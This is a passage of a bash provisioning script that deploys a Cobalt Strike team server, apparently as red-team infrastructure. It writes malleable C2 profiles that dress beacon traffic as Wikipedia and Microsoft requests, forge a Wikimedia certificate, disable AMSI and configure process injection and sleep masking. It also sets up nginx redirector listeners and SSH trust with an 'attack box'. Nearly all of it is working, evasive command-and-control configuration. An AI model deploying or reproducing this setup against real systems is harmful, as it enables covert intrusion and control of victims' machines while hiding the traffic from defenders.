    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set cleanup "true";
}

process-inject {
    set allocator "NtMapViewOfSection";
    set min_alloc "17500";
    set startrwx "false";
    set userwx   "false";
    transform-x86 { prepend "\x90\x90"; }
    transform-x64 { prepend "\x90\x90"; }
    execute {
        CreateThread "ntdll!RtlUserThreadStart+0x42";
        CreateThread;
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
PROFILEEOF
    chown -R ubuntu:ubuntu "$PROFILE_DIR"

    # Validate profile with c2lint (only if CS is extracted and licensed)
    if [ "$CS_EXTRACTED" = true ] && [ "$LICENSE_STATUS" = "ready" ] && [ -f /opt/cobaltstrike/server/c2lint ]; then
        echo "Validating Microsoft profile with c2lint..."
        cd /opt/cobaltstrike/server
        C2LINT_OUTPUT=$(./c2lint "$PROFILE_PATH" 2>&1) || true
        if echo "$C2LINT_OUTPUT" | grep -qi "error"; then
            echo "WARNING: c2lint reported errors:"
            echo "$C2LINT_OUTPUT" | grep -i "error"
        else
            echo "c2lint validation passed"
        fi
        cd /
    fi

    echo "Microsoft Azure Malleable profile deployed: $PROFILE_PATH"

elif [ "$MALLEABLE_PROFILE" = "wikipedia" ]; then
    echo "Deploying Wikipedia Malleable C2 profile..."
    PROFILE_PATH="$PROFILE_DIR/wikipedia.profile"
    cat > "$PROFILE_PATH" << 'PROFILEEOF'
# Wikipedia Malleable C2 Profile
# Based on @bluscreenofjeff wikipedia.profile (modernized)
# Source: https://github.com/rsmudge/Malleable-C2-Profiles + OPSEC hardening
#
# URIs must match nginx redirector location blocks:
#   GET:    /w/index.php?search=...  (beacon check-in as wiki search)
#   POST:   /wiki/<session_id>       (beacon data as article view)
#   Stager: /w/load.php (x86)       (MediaWiki resource loader)
#           /w/api.php (x64)        (MediaWiki API endpoint)

set sample_name "Wikipedia Profile";
set sleeptime "60000";
set jitter    "20";
set host_stage "false";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

dns-beacon {
    set dns_idle "8.8.4.4";
    set maxdns    "235";
}

https-certificate {
    set CN       "*.wikipedia.org";
    set C        "US";
    set L        "San Francisco";
    set O        "Wikimedia Foundation Inc";
    set OU       "IT";
    set ST       "California";
    set validity "365";
}

http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "mw-web.eqiad.main-84d4bc876f";
    header "Keep-Alive" "timeout=5, max=1000";
    header "Connection" "Keep-Alive";
    set trust_x_forwarded_for "true";
    set block_useragents "curl*,lynx*,wget*";
}

http-get {
    set uri "/w/index.php";

    client {
        header "Host" "en.wikipedia.org";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Referer" "https://en.wikipedia.org/wiki/Main_Page";
        header "Accept-Language" "en-US,en;q=0.9";

        metadata {
            base64url;
            parameter "search";
        }
        parameter "title" "Special%3ASearch";
        parameter "go" "Go";
    }

    server {
        header "Content-Type" "text/html; charset=UTF-8";
        header "Server" "mw-web.eqiad.main-84d4bc876f";
        header "X-Content-Type-Options" "nosniff";
        header "P3P" "CP=\"See https://en.wikipedia.org/wiki/Special:CentralAutoLogin/P3P for more info.\"";
        header "Vary" "Accept-Encoding,Cookie,Authorization";

        output {
            netbios;
            prepend "<!DOCTYPE html><html lang=en><head><meta charset=UTF-8><title>Search results - Wikipedia</title><script>document.documentElement.className=document.documentElement.className.replace(/(^|\s)client-nojs(\s|$)/,'$1client-js$2');</script></head><body class=mediawiki ltr sitedir-ltr mw-hide-empty-elt ns--1 ns-special mw-special-Search page-Special_Search skin-vector action-view><div id=mw-page-base class=noprint></div><div id=content class=mw-body role=main><div id=siteNotice></div><h1 id=firstHeading class=firstHeading lang=en>Search results</h1><div id=bodyContent class=mw-body-content><div class=searchresults><ul class=mw-search-results>";
            append "</ul></div></div></div><footer id=footer class=mw-footer role=contentinfo><ul id=footer-info><li>Text is available under the <a href=//creativecommons.org/licenses/by-sa/4.0/>Creative Commons Attribution-ShareAlike License 4.0</a></li></ul></footer></body></html>";
            print;
        }
    }
}

http-post {
    set uri "/wiki";
    set verb "GET";

    client {
        header "Host" "en.wikipedia.org";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.9";

        id {
            base64url;
            prepend "/";
            uri-append;
        }

        output {
            base64url;
            prepend "https://en.wikipedia.org/w/index.php?search=";
            append "&title=Special%3ASearch&go=Go";
            header "Referer";
        }
    }

    server {
        header "Content-Type" "text/html; charset=UTF-8";
        header "Server" "mw-web.eqiad.main-84d4bc876f";
        header "X-Content-Type-Options" "nosniff";
        header "P3P" "CP=\"See https://en.wikipedia.org/wiki/Special:CentralAutoLogin/P3P for more info.\"";
        header "Vary" "Accept-Encoding,Cookie,Authorization";

        output {
            prepend "<html><head><title>Wikipedia, the free encyclopedia</title><link rel=stylesheet href=/w/load.php?lang=en&modules=site.styles&only=styles&skin=vector></head><body class=mediawiki ltr sitedir-ltr mw-hide-empty-elt ns-0 ns-subject page-Main_Page skin-vector action-view><div id=mw-page-base class=noprint></div><div id=content class=mw-body role=main><a id=top></a><div id=siteNotice></div><h1 id=firstHeading class=firstHeading lang=en>Wikipedia</h1><div id=bodyContent class=mw-body-content><div id=mw-content-text lang=en dir=ltr class=mw-content-ltr><div class=mw-parser-output>";
            print;
        }
    }
}

http-stager {
    set uri_x86 "/w/load.php";
    set uri_x64 "/w/api.php";

    client {
        header "Host" "en.wikipedia.org";
        header "Accept" "text/css,*/*;q=0.1";
    }

    server {
        header "Content-Type" "text/javascript; charset=utf-8";
        header "Server" "mw-web.eqiad.main-84d4bc876f";
    }
}

stage {
    set allocator      "VirtualAlloc";
    set magic_pe       "NO";
    set userwx         "false";
    set stomppe        "true";
    set obfuscate      "true";
    set cleanup        "true";
    set sleep_mask     "true";
    set smartinject    "true";
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set cleanup "true";
}

process-inject {
    set allocator "NtMapViewOfSection";
    set min_alloc "17500";
    set startrwx "false";
    set userwx   "false";
    transform-x86 { prepend "\x90\x90"; }
    transform-x64 { prepend "\x90\x90"; }
    execute {
        CreateThread "ntdll!RtlUserThreadStart+0x42";
        CreateThread;
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
PROFILEEOF
    chown -R ubuntu:ubuntu "$PROFILE_DIR"

    # Validate profile with c2lint (only if CS is extracted and licensed)
    if [ "$CS_EXTRACTED" = true ] && [ "$LICENSE_STATUS" = "ready" ] && [ -f /opt/cobaltstrike/server/c2lint ]; then
        echo "Validating Wikipedia profile with c2lint..."
        cd /opt/cobaltstrike/server
        C2LINT_OUTPUT=$(./c2lint "$PROFILE_PATH" 2>&1) || true
        if echo "$C2LINT_OUTPUT" | grep -qi "error"; then
            echo "WARNING: c2lint reported errors:"
            echo "$C2LINT_OUTPUT" | grep -i "error"
        else
            echo "c2lint validation passed"
        fi
        cd /
    fi

    echo "Wikipedia Malleable profile deployed: $PROFILE_PATH"

elif [ "$MALLEABLE_PROFILE" = "custom" ]; then
    # Custom was selected but no profile content was provided
    echo "========================================================"
    echo "WARNING: Custom profile selected but no content provided"
    echo "========================================================"
    echo ""
    echo "The web app should have uploaded the custom profile content"
    echo "as base64 via the custom_profile_content variable."
    echo "This may mean the profile file was not uploaded before deployment."
    echo ""
    echo "Upload your .profile file manually:"
    echo "  1. Upload to: $PROFILE_DIR/custom.profile"
    echo "  2. Validate: cd /opt/cobaltstrike/server && ./c2lint $PROFILE_DIR/custom.profile"
    echo "  3. Set password: sudo /opt/cobaltstrike/set-password.sh"
    echo ""
    echo "========================================================"

else
    echo "========================================================"
    echo "WARNING: Unknown Malleable C2 profile selected: $MALLEABLE_PROFILE"
    echo "========================================================"
    echo ""
    echo "Valid options: default, amazon, google, microsoft, wikipedia, custom"
    echo "The team server will start WITHOUT a Malleable profile."
    echo ""
    echo "========================================================"
fi

if [ "$CS_EXTRACTED" = true ]; then
    write_step_status 3 "CS Download & Profile" "ok" "Profile: $MALLEABLE_PROFILE, License: $LICENSE_STATUS"
elif [ -n "$CS_ARCHIVE_S3_PATH" ] && [ "$CS_ARCHIVE_S3_PATH" != "" ]; then
    write_step_status 3 "CS Download & Profile" "failed" "S3 download or extraction failed"
else
    write_step_status 3 "CS Download & Profile" "warning" "No S3 path provided, skipped"
fi

# =============================================================================
# 4. Create Systemd Service for Team Server
# =============================================================================
echo "[4/5] Creating systemd service..."

if [ -f /opt/cobaltstrike/server/teamserver ]; then
    # Determine if REST API flag is needed
    EXPERIMENTAL_DB_FLAG=""
    if [ "$ENABLE_REST_API" = "true" ]; then
        EXPERIMENTAL_DB_FLAG=" --experimental-db"
        echo "  REST API enabled: adding --experimental-db flag to team server"
    fi

    # Create systemd service file
    cat > /etc/systemd/system/teamserver.service << EOF
[Unit]
Description=Cobalt Strike Team Server
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/cobaltstrike/server
ExecStart=/bin/bash -c '/opt/cobaltstrike/server/teamserver $(hostname -I | awk "{print \\$1}") $CS_PASSWORD $PROFILE_PATH$EXPERIMENTAL_DB_FLAG'
Restart=on-failure
RestartSec=10
StandardOutput=append:/opt/logs/teamserver.log
StandardError=append:/opt/logs/teamserver-error.log

[Install]
WantedBy=multi-user.target
EOF

    # Reload systemd and enable service
    systemctl daemon-reload
    systemctl enable teamserver
    
    # Only start if we have a password AND license is ready
    if [ -n "$CS_PASSWORD" ] && [ "$CS_PASSWORD" != "" ] && [ "$LICENSE_STATUS" = "ready" ]; then
        echo "Starting team server..."
        systemctl start teamserver
        echo "Team server service created and started"
        echo "Team server running on port 50050"
    else
        echo "Team server service created but NOT started"
        if [ "$LICENSE_STATUS" = "needs_activation" ]; then
            echo "REASON: License activation required"
            echo "Run: cd /opt/cobaltstrike && sudo ./update"
        elif [ -z "$CS_PASSWORD" ]; then
            echo "REASON: No password configured (recommended for OPSEC)"
        fi
    fi

    # === REST API Server (optional) ===
    if [ "$ENABLE_REST_API" = "true" ]; then
        echo "  Configuring Cobalt Strike REST API server..."

        if [ -d /opt/cobaltstrike/server/rest-server ] && [ -f /opt/cobaltstrike/server/rest-server/csrestapi ]; then
            chmod +x /opt/cobaltstrike/server/rest-server/csrestapi

            # csrestapi --port is the team server management port it connects TO (50050),
            # NOT the REST API listening port. The REST API always listens on 50443.
            cat > /etc/systemd/system/csrestapi.service << EOF
[Unit]
Description=Cobalt Strike REST API Server
After=teamserver.service
Requires=teamserver.service

[Service]
Type=simple
User=root
WorkingDirectory=/opt/cobaltstrike/server/rest-server
ExecStartPre=/bin/sleep 15
ExecStart=/opt/cobaltstrike/server/rest-server/csrestapi --pass $CS_PASSWORD --user csrestapi --host 127.0.0.1 --port 50050
Restart=on-failure
RestartSec=10
StandardOutput=append:/opt/logs/csrestapi.log
StandardError=append:/opt/logs/csrestapi-error.log

[Install]
WantedBy=multi-user.target
EOF

            systemctl daemon-reload
            systemctl enable csrestapi

            # Start REST API if team server is running
            if systemctl is-active --quiet teamserver; then
                systemctl start csrestapi
                sleep 5
                if systemctl is-active --quiet csrestapi; then
                    echo "  [OK] REST API server started on port 50443"
                else
                    echo "  [WARN] REST API server failed to start. Check: journalctl -u csrestapi -n 20"
                fi
            else
                echo "  REST API will start automatically when team server starts"
            fi
        else
            echo "  [WARN] REST API server not found at /opt/cobaltstrike/server/rest-server/"
            echo "  [WARN] REST API requires Cobalt Strike 4.12+. Skipping."
        fi
    fi

    # Create set-password helper (always useful for password rotation)
    cat > /opt/cobaltstrike/set-password.sh << 'SETPWEOF'
#!/bin/bash
# Set or change the team server password
# This updates the systemd service and restarts the team server
set -euo pipefail

read -sp "Enter team server password: " PASSWORD
echo
if [ -z "$PASSWORD" ]; then
    echo "Error: Password cannot be empty"
    exit 1
fi
read -sp "Confirm password: " PASSWORD2
echo
if [ "$PASSWORD" != "$PASSWORD2" ]; then
    echo "Error: Passwords do not match"
    exit 1
fi

# Get the server's private IP (CS rejects 0.0.0.0)
SERVER_IP=$(hostname -I | awk '{print $1}')

# Find the active Malleable profile (if any)
PROFILE_FILE=$(find /opt/cobaltstrike/profiles -name '*.profile' -type f 2>/dev/null | head -1)
PROFILE_ARG=""
if [ -n "$PROFILE_FILE" ]; then
    PROFILE_ARG=" $PROFILE_FILE"
    echo "Using Malleable profile: $PROFILE_FILE"
fi

# Check if --experimental-db is currently set
HAS_EXPERIMENTAL_DB=""
if grep -q "experimental-db" /etc/systemd/system/teamserver.service 2>/dev/null; then
    HAS_EXPERIMENTAL_DB=" --experimental-db"
fi

# Update systemd service with the new password and real IP
sed -i "s|ExecStart=.*|ExecStart=/opt/cobaltstrike/server/teamserver $SERVER_IP $PASSWORD$PROFILE_ARG$HAS_EXPERIMENTAL_DB|" /etc/systemd/system/teamserver.service
systemctl daemon-reload
systemctl restart teamserver

# Also update REST API if it exists
if systemctl list-unit-files | grep -q csrestapi; then
    sed -i "s|--pass [^ ]*|--pass $PASSWORD|" /etc/systemd/system/csrestapi.service
    systemctl daemon-reload
    systemctl restart csrestapi
    echo "REST API server restarted with new password"
fi
sleep 3
if systemctl is-active --quiet teamserver; then
    echo "Team server started on port 50050"
    echo "Connect your CS client to this server on port 50050"
else
    echo "Failed to start. Check: journalctl -u teamserver -n 20"
fi
SETPWEOF
    chmod +x /opt/cobaltstrike/set-password.sh
    chown root:root /opt/cobaltstrike/set-password.sh
else
    echo "Skipping team server service creation - teamserver script not found"
fi
write_step_status 4 "Systemd Service" "ok"

# =============================================================================
# 5. Create Helper Scripts and README
# =============================================================================
echo "[5/5] Creating helper scripts..."

# README with status and instructions
cat > /home/ubuntu/README.txt << READMEEOF
================================================================================
                    COBALT STRIKE TEAM SERVER
================================================================================

LICENSE STATUS
--------------
$(if [ "$LICENSE_STATUS" = "ready" ]; then
    echo "License: ACTIVATED (automated via Secrets Manager)"
    echo ""
    echo "The license was activated automatically during deployment."
elif [ -n "$CS_LICENSE_SECRET_NAME" ] && [ "$CS_LICENSE_SECRET_NAME" != "" ]; then
    echo "License: ACTIVATION ATTEMPTED (check /var/log/cs-install.log for details)"
    echo "If it failed, activate manually:"
    echo "    cd /opt/cobaltstrike && sudo ./update"
else
    echo "License: NOT YET ACTIVATED"
    echo "Activate your Cobalt Strike license:"
    echo "    cd /opt/cobaltstrike && sudo ./update"
    echo "Enter your license key when prompted."
fi)

PASSWORD & STARTING
-------------------
$(if [ -n "$CS_PASSWORD" ] && [ "$CS_PASSWORD" != "" ] && [ "$LICENSE_STATUS" = "ready" ]; then
    echo "Team server is running automatically on port 50050."
elif [ "$LICENSE_STATUS" = "ready" ]; then
    echo "Set a password and start the team server:"
    echo "    sudo /opt/cobaltstrike/set-password.sh"
else
    echo "After license activation, set a password and start:"
    echo "    sudo /opt/cobaltstrike/set-password.sh"
fi)

USEFUL COMMANDS
---------------
Check status:     /opt/cobaltstrike/check-status.sh
Restart:          sudo systemctl restart teamserver
View logs:        tail -f /opt/logs/teamserver.log
Stop:             sudo systemctl stop teamserver
Install log:      cat /var/log/cs-install.log

CONNECTION INFO
---------------
Team Server Port: 50050
Connect your CS Client to: <THIS_SERVER_IP>:50050

================================================================================
READMEEOF
chown ubuntu:ubuntu /home/ubuntu/README.txt

# CS Listener Configuration Guide
if [ -n "$PRIMARY_DOMAIN" ] && [ "$PRIMARY_DOMAIN" != "" ]; then
    C2_FQDN="$C2_SUBDOMAIN.$PRIMARY_DOMAIN"
    cat > /home/ubuntu/CS-LISTENER-GUIDE.txt << GUIDEEOF
===============================================================
 COBALT STRIKE LISTENER CONFIGURATION GUIDE
 Auto-generated during deployment — $(date +%Y-%m-%d)
===============================================================

DOMAIN:           $C2_FQDN
TEAM SERVER:      localhost:50050 (via SSH tunnel from bastion)
MALLEABLE C2:     $MALLEABLE_PROFILE
REDIRECTORS:      Resolved via Route 53 DNS (round-robin)

---------------------------------------------------------------
 MALLEABLE C2 PROFILE
---------------------------------------------------------------
$(if [ "$MALLEABLE_PROFILE" = "default" ] || [ -z "$MALLEABLE_PROFILE" ]; then
    echo " Profile:   jQuery (threatexpress/malleable-c2)"
    echo " Status:    AUTO-LOADED at team server startup"
    echo " Location:  /opt/cobaltstrike/profiles/jquery.profile"
    echo ""
    echo " The team server is started with this profile automatically."
    echo " Nginx redirectors are pre-configured to match these URIs:"
    echo "   GET:     /jquery-3.3.1.min.js"
    echo "   POST:    /jquery-3.3.2.min.js"
    echo "   Stager:  /jquery-3.3.1.slim.min.js (x86)"
    echo "            /jquery-3.3.2.slim.min.js (x64)"
    echo ""
    echo " No manual profile configuration needed."
else
    echo " Profile:   $MALLEABLE_PROFILE (MANUAL SETUP REQUIRED)"
    echo " Status:    NOT loaded — you must provide a .profile file"
    echo ""
    echo " REQUIRED STEPS:"
    echo "   1. Upload your .profile to /opt/cobaltstrike/profiles/"
    echo "   2. Validate: cd /opt/cobaltstrike/server && ./c2lint /opt/cobaltstrike/profiles/your.profile"
    echo "   3. Update systemd ExecStart to include the profile path"
    echo "   4. Restart: sudo systemctl daemon-reload && sudo systemctl restart teamserver"
    echo "   5. Update nginx on EACH redirector to match your profile URIs:"
    echo "      sudo nano /etc/nginx/sites-available/c2-redirector"
    echo "      sudo nginx -t && sudo systemctl reload nginx"
fi)

---------------------------------------------------------------
 HTTPS LISTENER SETUP (Recommended)
---------------------------------------------------------------
 1. Open Cobalt Strike > Listeners > Add
 2. Configure:

    Name:           HTTPS
    Payload:        Beacon HTTPS
    HTTPS Host:     $C2_FQDN
    HTTPS Port:     443
    HTTPS Hosts:    $C2_FQDN

 NOTE: Use the DOMAIN NAME, not redirector IPs.
       Route 53 round-robins across all redirectors.
       Let's Encrypt cert on redirectors matches the domain.
       The Malleable profile is loaded server-side — no need to
       select it in the listener config.

---------------------------------------------------------------
 HTTP LISTENER SETUP (Fallback)
---------------------------------------------------------------
    Name:           HTTP
    Payload:        Beacon HTTP
    HTTP Host:      $C2_FQDN
    HTTP Port:      80

---------------------------------------------------------------
 DNS LISTENER SETUP (Optional)
---------------------------------------------------------------
    Name:           DNS
    Payload:        Beacon DNS
    DNS Host:       $C2_FQDN
    DNS Port:       53

---------------------------------------------------------------
 SSL CHAIN
---------------------------------------------------------------
 Target <--HTTPS (Let's Encrypt)--> Redirector <--HTTPS (internal)--> Team Server

 The redirector handles SSL termination with a trusted Let's Encrypt
 certificate. No certificate configuration needed in Cobalt Strike.

---------------------------------------------------------------
 TRAFFIC FLOW
---------------------------------------------------------------
 Beacon callback:
   Target -> $C2_FQDN (DNS lookup) -> Redirector EIP -> nginx -> Team Server

 Operator access:
   Laptop -> ssh -L 50050:team_server_ip:50050 ubuntu@bastion_eip
   CS Client -> localhost:50050

===============================================================
GUIDEEOF
else
    cat > /home/ubuntu/CS-LISTENER-GUIDE.txt << GUIDEEOF
===============================================================
 COBALT STRIKE LISTENER CONFIGURATION GUIDE
===============================================================

 No domain configured for this deployment.

 To use HTTPS listeners with domain-based C2:
   1. Set 'primary_domain_name' in your deployment configuration
   2. Redeploy — this guide will auto-populate with your domain,
      redirector IPs, and listener settings

 For now, you can create listeners using redirector IPs directly,
 but this is NOT recommended for production engagements (no
 trusted SSL, easily blocked by IP).

===============================================================
GUIDEEOF
fi
chown ubuntu:ubuntu /home/ubuntu/CS-LISTENER-GUIDE.txt

# Script to check team server status
cat > /opt/cobaltstrike/check-status.sh << 'EOF'
#!/bin/bash
echo "=== Cobalt Strike Team Server Status ==="
echo ""

# Check license status (auth file is created by ./update when license is activated)
if [ -f /opt/cobaltstrike/server/cobaltstrike.auth.server ]; then
    echo "LICENSE: ✅ Activated"
    echo ""
elif [ -f /opt/cobaltstrike/server/TeamServerImage ]; then
    echo "LICENSE: ❌ NOT ACTIVATED (no auth file)"
    echo "         Run: cd /opt/cobaltstrike && sudo ./update"
    echo ""
else
    echo "LICENSE: ⚠️  TeamServerImage not found"
    echo ""
fi

echo "=== Service Status ==="
systemctl status teamserver --no-pager 2>/dev/null || echo "Service not running"
echo ""

echo "=== Listening Ports ==="
netstat -tlnp 2>/dev/null | grep -E '(50050|443|80)' || echo "Not listening on expected ports"
echo ""

echo "=== Recent Logs ==="
tail -20 /opt/logs/teamserver.log 2>/dev/null || echo "No logs yet"
EOF
chmod +x /opt/cobaltstrike/check-status.sh

# Script to activate license
cat > /opt/cobaltstrike/activate-license.sh << 'EOF'
#!/bin/bash
echo "=== Cobalt Strike License Activation ==="
echo ""
echo "This will run the Cobalt Strike update program."
echo "You will need your license key."
echo ""
cd /opt/cobaltstrike
sudo ./update
echo ""
echo "If activation was successful, start the team server with:"
echo "    sudo systemctl start teamserver"
EOF
chmod +x /opt/cobaltstrike/activate-license.sh

# Script to restart team server
cat > /opt/cobaltstrike/restart-teamserver.sh << 'EOF'
#!/bin/bash
echo "Restarting team server..."
sudo systemctl restart teamserver
sleep 3
sudo systemctl status teamserver --no-pager
EOF
chmod +x /opt/cobaltstrike/restart-teamserver.sh

# Script to view logs
cat > /opt/cobaltstrike/view-logs.sh << 'EOF'
#!/bin/bash
tail -f /opt/logs/teamserver.log
EOF
chmod +x /opt/cobaltstrike/view-logs.sh

chown -R ubuntu:ubuntu /opt/cobaltstrike
write_step_status 5 "Helper Scripts" "ok"

# =============================================================================
# Installation Complete
# =============================================================================
echo ""
echo "=============================================="
echo "Installation Complete!"
echo "Finished: $(date)"
echo "=============================================="
echo ""
if [ "$LICENSE_STATUS" = "needs_activation" ]; then
    echo "⚠️  NEXT STEP: Activate your Cobalt Strike license"
    echo "    cd /opt/cobaltstrike && sudo ./update"
    echo ""
fi
echo "=== Cobalt Strike ==="
echo "  Check status:  /opt/cobaltstrike/check-status.sh"
echo "  Activate:      /opt/cobaltstrike/activate-license.sh"
echo "  Restart:       /opt/cobaltstrike/restart-teamserver.sh"
echo "  View logs:     /opt/cobaltstrike/view-logs.sh"
echo "  Team server:   Port 50050"
echo ""
echo "=== Tools ==="
echo "  Profiles dir:  /opt/cobaltstrike/profiles/"
echo ""

# Create completion marker
touch /opt/cobaltstrike/.install-complete
echo "LICENSE_STATUS=$LICENSE_STATUS" > /opt/cobaltstrike/bootstrap-status

# =============================================================================
# SSH KEY EXCHANGE: Pick up attack box public key from S3
# The attack box generates a key pair during its bootstrap and uploads
# the public key to S3. We poll for it and add it to authorized_keys
# so the operator can SSH from the attack box to this team server.
#
# The attack box boots in parallel and its init script takes 15-20 minutes,
# so the key won't exist yet. We install a systemd timer that polls every
# 60 seconds and self-disables once the key is found.
# =============================================================================
if [ -n "$CS_ARCHIVE_S3_PATH" ]; then
    BUCKET_NAME=$(echo "$CS_ARCHIVE_S3_PATH" | sed 's|s3://||' | cut -d'/' -f1)
    DEPLOY_ID=$(echo "$CS_ARCHIVE_S3_PATH" | sed 's|s3://[^/]*/||' | cut -d'/' -f1)
    ATTACKBOX_PUB_KEY="s3://$BUCKET_NAME/$DEPLOY_ID/ssh-keys/attackbox_internal.pub"

    echo "[SSH] Installing systemd timer to poll for attack box key at $ATTACKBOX_PUB_KEY"

    # Create the polling script
    cat > /opt/cobaltstrike/fetch-attackbox-key.sh <<'KEYEOF'
#!/bin/bash
S3_KEY_PATH="__S3_KEY_PATH__"
LOG="/var/log/attackbox-key-fetch.log"

echo "[$(date)] Checking for attack box key at $S3_KEY_PATH..." >> "$LOG"

if aws s3 cp "$S3_KEY_PATH" /tmp/attackbox.pub 2>/dev/null; then
    ABKEY=$(cat /tmp/attackbox.pub | tr -d '\r')
    if [ -n "$ABKEY" ] && ! grep -qF "$ABKEY" /home/ubuntu/.ssh/authorized_keys 2>/dev/null; then
        echo "$ABKEY" >> /home/ubuntu/.ssh/authorized_keys
        echo "[$(date)] Attack box key added to authorized_keys" >> "$LOG"
    else
        echo "[$(date)] Attack box key already present" >> "$LOG"
    fi
    rm -f /tmp/attackbox.pub
    # Self-disable: stop the timer now that key is found
    systemctl stop fetch-attackbox-key.timer
    systemctl disable fetch-attackbox-key.timer
    echo "[$(date)] Timer disabled -- key exchange complete" >> "$LOG"
else
    echo "[$(date)] Key not found yet, will retry..." >> "$LOG"
fi
KEYEOF
    # Replace placeholder with actual S3 path
    sed -i "s|__S3_KEY_PATH__|$ATTACKBOX_PUB_KEY|" /opt/cobaltstrike/fetch-attackbox-key.sh
    chmod +x /opt/cobaltstrike/fetch-attackbox-key.sh

    # Create systemd service
    cat > /etc/systemd/system/fetch-attackbox-key.service <<'SVCEOF'
[Unit]
Description=Fetch attack box SSH public key from S3
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/opt/cobaltstrike/fetch-attackbox-key.sh
User=root
SVCEOF

    # Create systemd timer (every 60 seconds, start 30s after boot)
    cat > /etc/systemd/system/fetch-attackbox-key.timer <<'TMREOF'
[Unit]
Description=Poll S3 for attack box SSH key every 60 seconds

[Timer]
OnBootSec=30s
OnUnitActiveSec=60s
AccuracySec=10s

[Install]
WantedBy=timers.target
TMREOF

    systemctl daemon-reload
    systemctl enable fetch-attackbox-key.timer
    systemctl start fetch-attackbox-key.timer
    echo "[SSH] Systemd timer installed and started (polls every 60s, self-disables on success)"
fi

# Upload bootstrap status to S3 (so the deployment UI can track completion)
# Use IMDSv2 token (required since http_tokens = "required" is enforced)
IMDS_TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || echo "")
INSTANCE_ID=$(curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null || echo "unknown")
if [ -n "$CS_ARCHIVE_S3_PATH" ]; then
    BUCKET_NAME=$(echo "$CS_ARCHIVE_S3_PATH" | sed 's|s3://||' | cut -d'/' -f1)
    echo "{\"status\":\"complete\",\"instance_id\":\"$INSTANCE_ID\",\"role\":\"teamserver\",\"license_status\":\"$LICENSE_STATUS\",\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}" | \
        aws s3 cp - "s3://$BUCKET_NAME/status/$INSTANCE_ID-teamserver.json" 2>/dev/null || \
        echo "WARNING: Failed to upload bootstrap status to S3 (non-fatal)"
fi
